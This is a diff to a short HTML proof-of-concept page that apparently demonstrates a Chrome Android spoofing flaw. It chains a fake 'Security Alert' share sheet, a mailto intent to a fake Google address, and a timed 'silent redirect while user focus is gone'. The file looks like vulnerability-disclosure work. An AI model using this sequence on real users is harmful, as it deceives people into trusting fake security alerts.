@@ -2,22 +2,36 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PoC</title>
+  <title>Combined PoC</title>
 </head>
 <body>
 
-<button onclick="start()">Open</button>
+<button onclick="start()">Contact Support</button>
 
 <script>
 function start() {
-  // 1. Trigger Gmail chooser
-  location.href = "mailto:test@gmail.com";
 
-  // 2. After chooser shows, redirect to Instagram
+  // 1️⃣ Web Share (HARUS langsung dari user gesture)
+  if (navigator.share) {
+    navigator.share({
+      title: "Security Alert",
+      text: "Suspicious activity detected. Please contact support.",
+      url: "https://support.google.com"
+    }).catch(() => {});
+  }
+
+  // 2️⃣ Trigger mailto intent (email chooser)
   setTimeout(() => {
     location.href =
-      "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end";
-  }, 800);
+      "mailto:securityfake@google.com" +
+      "?subject=Chrome%20Android%20Security%20Alert" +
+      "&body=Please%20review%20your%20account%20activity.";
+  }, 300);
+
+  // 3️⃣ Silent redirect while user focus is gone
+  setTimeout(() => {
+    location.href = "https://myaccount.google.com/security";
+  }, 900);
 }
 </script>
 
